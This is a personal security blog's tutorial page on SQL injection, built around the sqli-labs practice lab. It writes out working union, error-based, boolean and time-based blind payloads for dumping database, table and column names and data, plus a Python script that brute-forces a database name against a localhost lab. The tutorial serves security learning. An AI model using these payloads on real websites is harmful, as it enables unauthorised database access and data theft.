<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Chejarla Santosh Kumar</title>
	<link href="my logo.jpg" rel="icon" type="image/jpg" />
	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CVarela+Round" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Owl Carousel -->
	<link type="text/css" rel="stylesheet" href="css/owl.carousel.css" />
	<link type="text/css" rel="stylesheet" href="css/owl.theme.default.css" />

	<!-- Magnific Popup -->
	<link type="text/css" rel="stylesheet" href="css/magnific-popup.css" />

	<!-- Font Awesome Icon -->
	<link rel="stylesheet" href="css/font-awesome.min.css">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>

<body>

	<!-- Header -->
	<header>

		<!-- Nav -->
		<nav id="nav" class="navbar">
			<div class="container">

				<div class="navbar-header">
					<!-- Logo -->
					<div class="navbar-brand">
						<a href="index.html">
							<img class="logo" src="img/my logo.jpg" alt="logo">
						</a>
					</div>
					<!-- /Logo -->

					<!-- Collapse nav button -->
					<div class="nav-collapse">
						<span></span>
					</div>
					<!-- /Collapse nav button -->
				</div>

				<!--  Main navigation  -->
				<ul class="main-nav nav navbar-nav navbar-right">
					<li><a href="index.html">Home</a></li>
					<li><a href="web-intro.html">Web exploitation</a></li>
					<li><a href="recon.html">Recon</a></li>
					<li><a href="android.html">Android exploitation</a></li>
					<li><a href="random.html">Random stuff</a></li>
					<li><a href="CV/resume.html">Resume</a></li>
					<li><a href="index.html#contact">Contact</a></li>
				</ul>
				<!-- /Main navigation -->

			</div>
		</nav>
		<!-- /Nav -->

		<!-- header wrapper -->
		<div class="header-wrapper sm-padding bg-grey">
				<div class="container">
					<h2>Web exploitation</h2>
					<ul class="breadcrumb">
						<li class="breadcrumb-item"><a href="index.html">Home</a></li>
						<li class="breadcrumb-item"><a href="web-intro.html">web</a></li>
						<li class="breadcrumb-item"><a href="web-sql.html">SQL</a></li>
					</ul>
				</div>
			</div>
		<!-- /header wrapper -->

	</header>
	<!-- /Header -->

	<!-- Blog -->
	<div id="blog" class="section md-padding">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<!-- Main -->
				<main id="main" class="col-md-9">
					<div class="blog">
						<div class="blog-img">
							<img class="img-responsive" src="./img/wiki/sql/sql.png" alt="">
						</div>
						<div class="blog-content">
							<ul class="blog-meta">
								<li><i class="fa fa-user"></i>CHS</li>
								<li><i class="fa fa-clock-o"></i>25th Aug 2018</li>
								<!--<li><i class="fa fa-comments"></i>57</li>-->
							</ul>
							
								<h1><a id="SQL_Injections_0"></a>SQL Injections</h1>
								<p>First Find the injection : ) , ‘ , &quot; , ) , ‘) , “)</p>
								<p>INJECTION TYPES</p>
								<ul>
								<li>&#9658;Error based</li>
								<li>&#9658;Blind
								<ul>
								<li>&#9642;  Partial blind [Boolean]</li>
								<li>&#9642; Full blind [Time based]</li>
								</ul>
								</li>
								</ul>
								<h2><a id="HandyFunctions_9"></a>Handy-Functions:</h2>
								<table class="table table-striped table-bordered">
								<thead>
								<tr>
								<th>Function</th>
								<th>Description</th>
								</tr>
								</thead>
								<tbody>
								<tr>
								<td>version()/@@version/@global.version</td>
								<td>Gives the os info</td>
								</tr>
								<tr>
								<td>ser()/current_user(),system_user(),session_user()</td>
								<td>Gives the info about the user of the database (E.g : root@localhost)</td>
								</tr>
								<tr>
								<td>database()/schema()</td>
								<td>Gives the database name</td>
								</tr>
								<tr>
								<td>@@hostname</td>
								<td>Gives the host name</td>
								</tr>
								<tr>
								<td>UUID()</td>
								<td>Gives the MAC address</td>
								</tr>
								<tr>
								<td>Group_concat()</td>
								<td>concatenate the items the the given field</td>
								</tr>
								<tr>
								<td>substr(“abc”,1,1)</td>
								<td>a</td>
								</tr>
								<tr>
								<td>mid(“abc”,1,1)</td>
								<td>a</td>
								</tr>
								<tr>
								<td>ascii(‘A’)</td>
								<td>65</td>
								</tr>
								<tr>
								<td>char(65)</td>
								<td>A</td>
								</tr>
								<tr>
								<td>concat(‘a’,’b’)</td>
								<td>ab</td>
								</tr>
								<tr>
								<td>concat_ws(‘-’,’a’,’b’,’c’)</td>
								<td>a-b-c</td>
								</tr>
								<tr>
								<td>benchmark(no.of loops,expression)</td>
								<td>eg. select benchmark(10000000000,1+1)</td>
								</tr>
								<tr>
								<td>char(97,98,99)</td>
								<td>abc</td>
								</tr>
								<tr>
								<td>@@basedir</td>
								<td>installation patch</td>
								</tr>
								<tr>
								<td>@@version_compile_os</td>
								<td>OS</td>
								</tr>
								<tr>
								<td>@@innodb_version</td>
								<td>mysql version</td>
								</tr>
								<tr>
								<td>greatest(‘a’,‘b’)=‘b’</td>
								<td>1</td>
								</tr>
								<tr>
								<td>greatest(1,2) between 1 and 3</td>
								<td>1</td>
								</tr>
								<tr>
								<td>like</td>
								<td>=</td>
								</tr>
								</tbody>
								</table>
								<h2><a id="Lab_33"></a>Lab</h2>
								<p>Clone the repo and set up the lab in your system link: <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
								<p>This is the best place to practice SQL injections.</p>
								<h3><a id="Finding_the_injection__39"></a>Finding the injection :</h3>
								<p>Try the following basic injection</p>
								<pre><code>‘ , ” , ) ,  , ”) , ’) or 1 -- - [eg : ‘ or 1 --]
‘ , ” , ) ,  , ”) , ’) || ‘,”,(, ,(”,(’ 1 [eg : ‘ or ‘1 ]</code></pre>
								<p>Once the injection is found</p>
								<p>Find the number of columns in the statement</p>
								<p>Find the database name, table names, column names by the below-mentioned methods</p>
								<p>Finding the No.of columns in the statement :</p>
								<ol>
								<li>Start by injecting order by [or group by] 1,2,3…N once you get the error “unknown column” stop there,  then the no.of columns are N-1</li>
								</ol>
								<p>Using the columns that are displayed as a result of query we can dump the database</p>
								<ol start="3">
								<li>Consider the no.of columns are 3,  and the columns that are being displayed are 2, using those 2 columns we have to dump the database</li>
								</ol>
								<p>Finding the database name:</p>
								<pre><code>‘ union select 1,database(),3 -- -</code></pre>
								<img src="img/wiki/sql/sqld.png" width="1000em">
								<p>Finding the tables in the database :</p>
								<pre><code>‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 -- -</code></pre>
								<img src="img/wiki/sql/sqlt.png" width="1000em">
								<p>Finding the columns in the database :</p>
								<pre><code>‘ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=”        ”),2 -- -</code></pre>
								<p>[in the blank space give the table name]</p>								<img src="img/wiki/sql/sqlc.png" width="1000em">
								<p>Now dumping the information from the columns :</p>
								<pre><code>‘ union select 1,(select column_name from table_name),3 -- -</code></pre>
								<p>[ the columns_name and the table_name are the names obtained from the above injections]</p>
								<p>– all the above injections are based on the assumption the injection is using [ ‘ ] and the no.of columns are 3, out of which the result of the middle column is being displayed in the web-page</p>
								<p>ERROR-BASED:</p>
								<p>In this case, you can’t directly dump the database on the screen but you have to dump the data using the errors that we will force to pop-up</p>
								<p>Basic-query :</p>
								<pre><code>SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)</code></pre>
								<p>Here instead of username from users,Start from the base like knowing the database name,tables in the database,columns in each table etc. viz database(),table_name from information_schema.tables where table_schema=database() etc.</p>
								<h2><a id="Blind_Injections_90"></a>Blind Injections</h2>
								<h3><a id="Boolean_based_92"></a>Boolean based:</h3>
								<p>As the name says we will dump the database based on the boolean injection output</p>
								<p>Finding the error is same : ‘ or 1 ; “ or 1 ……</p>
								<p>Now we will inject our query at the place of one as follows :</p>
								<pre><code>‘ or (select database()=”security”) -- -</code></pre>
								<p>If the database name is security the query in the parentheses will return 1 and the whole query value become true hence we will get the output</p>
								<p>Let’s dump the database :</p>
								<p>Our first aim to find the length of the database name :</p>
								<pre><code>‘ or (length(database())=5) -- -</code></pre>
								<p>If the length of the name if the database it will return true value.<br>
								On knowing the length of the database name lets brute force the database name ,Here Regex comes to play I will suggest to go through some basic syntax of regex.</p>
								<pre><code>‘ or (substr(database(),1,1)=”a%”)</code></pre>
								<p>This query will return true if the name of the database starts with a .So brute force  from a - z.I will recommend to bruteforce with an automation script.For that you will need to know about the libraries : requests and time in python.<br>
								Documentation link for requests : <a href="http://docs.python-requests.org/en/master/user/quickstart/">http://docs.python-requests.org/en/master/user/quickstart/</a><br>
								Documentation linke for Time :<br>
								<a href="https://docs.python.org/2/library/time.html">https://docs.python.org/2/library/time.html</a></p>
								<p>A python programme for brute forcing the database name:</p>
								<pre><code class="language-python"><span class="hljs-keyword">import</span> requests
								
url1 = <span class="hljs-string">"http://localhost/sqli-labs-master/Less-8/?id=1' and (substr(database(),"</span>
url2 = <span class="hljs-string">"http://localhost/sqli-labs-master/Less-8/?id=1' and (length(database())="</span>
pay=<span class="hljs-string">"abcdefghijklmnopqrstuvwxyz,1234567890-_.@!{}=-)(*&amp;^%$#"</span>
database=<span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):
	query = url2 + str(i) + <span class="hljs-string">") -- -"</span>
	http = requests.get(query)
	content = http.text
	<span class="hljs-keyword">if</span> <span class="hljs-string">"You are in..........."</span> <span class="hljs-keyword">in</span> content:
		length = i

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):
	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pay:
		query=url1 + str(i) + <span class="hljs-string">",1"</span> + <span class="hljs-string">")='"</span> + j+<span class="hljs-string">"') -- -"</span>
		http = requests.get(query)
		content=http.text
		<span class="hljs-keyword">if</span> <span class="hljs-string">"You are in..........."</span> <span class="hljs-keyword">in</span> content:
			database=database+j
								
print(<span class="hljs-string">"The database name : "</span> + database)</code></pre>
								<p>You can make it your own way which you may think is the best and has less time complexity.</p>
								<p>So Now that you know how to bruteforce the database name you can get the whole database by modifying the queries with the previous knowledge you got from the error based injections.</p>
								<h3><a id="Time_based__153"></a>Time based :</h3>
								<p>This not so different from the boolean based injections.The only thing here is you are going to use an if-condition .</p>
								<p>Let’s try to do it in backend :</p>
								<p>Try</p>
								<pre><code>select sleep(10);
</code></pre><img src="img/wiki/sql/sql1.png">
								<p>You will get the response only after 10 sec</p>
								<pre><code>Select if(database()=”security”,sleep(5),null)
</code></pre>
								<p>if the name of the database() is security you will get the response only after 5 sec.</p>
								<p>Now let’s try to inject it :</p>
								<pre><code>1‘ and if((select substr((select database()),1,1)=”s”,sleep(5),null) -- -</code></pre>
								<p>The databse responded after 5 sec. By using above mentioned functions and the general notion you got from the boolean based injections try to make a python script and dump the database.</p>
								<p>To get a good idea of sql injections complete the sql labs and <a href="los.eagle-jump.org">los.eagle-jump.org</a></p>
						<!-- blog author -->
						<div class="blog-author">
							<div class="media">
								<div class="media-left">
									<img class="media-object" src="my logo.jpg" height="150em" alt="">
								</div>
								<div class="media-body">
									<div class="media-heading">
										<h3>CHS</h3>
										<div class="author-social">
											<a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a>
											<a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a>
											<a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a>
											<a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a>
										</div>
									</div>
									<p>SQL injections is a big topic which cannot be covered completely in a single post, I'll be updating this post when ever I find useful functions and techniques.</p>
								</div>
							</div>
						</div>
						<!-- /blog author -->

					</div>
				</main>
				<!-- /Main -->


				<!-- Aside -->
				<aside id="aside" class="col-md-3">

					<!-- Category -->
					<div class="widget">
						<h3 class="title">Topics</h3>
						<div class="widget-category">
								<a href="web-intro.html">Intro</a>
							<a href="web-fileupload.html">File upload</a>
							<a href="web-localfile.html">Local file inclusion</a>
							<a href="web-sql.html">SQL injections</a>
							<!--
							<a href="#">Web Development<span>(74)</span></a>
							<a href="#">Branding<span>(60)</span></a>
							<a href="#">Photography<span>(5)</span></a>
							-->
						</div>
					</div>
					<!-- /Category -->

				</aside>
				<!-- /Aside -->

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</div>
	<!-- /Blog -->

	<!-- Footer -->
	<footer id="footer" class="sm-padding bg-dark">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<div class="col-md-12">

					<!-- footer logo -->
					<div class="footer-logo">
						<a href="index.html"><img src="img/my logo.jpg" alt="logo"></a>
					</div>
					<!-- /footer logo -->

					<!-- footer follow -->
					<ul class="footer-follow">
						<li><a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a></li>
						<li><a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a></li>
						<li><a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a></li>
						<li><a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a></li>
					</ul>
					<!-- /footer follow -->

					<!-- footer copyright -->
					<div class="footer-copyright">
						<p>Copyright © 2017. All Rights Reserved. Designed by <a href="https://colorlib.com" target="_blank">Colorlib</a></p>
					</div>
					<!-- /footer copyright -->

				</div>

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</footer>
	<!-- /Footer -->

	<!-- Back to top -->
	<div id="back-to-top"></div>
	<!-- /Back to top -->

	<!-- Preloader -->
	<div id="preloader">
		<div class="preloader">
			<span></span>
			<span></span>
			<span></span>
			<span></span>
		</div>
	</div>
	<!-- /Preloader -->

	<!-- jQuery Plugins -->
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<script type="text/javascript" src="js/owl.carousel.min.js"></script>
	<script type="text/javascript" src="js/jquery.magnific-popup.js"></script>
	<script type="text/javascript" src="js/main.js"></script>

</body>

</html>
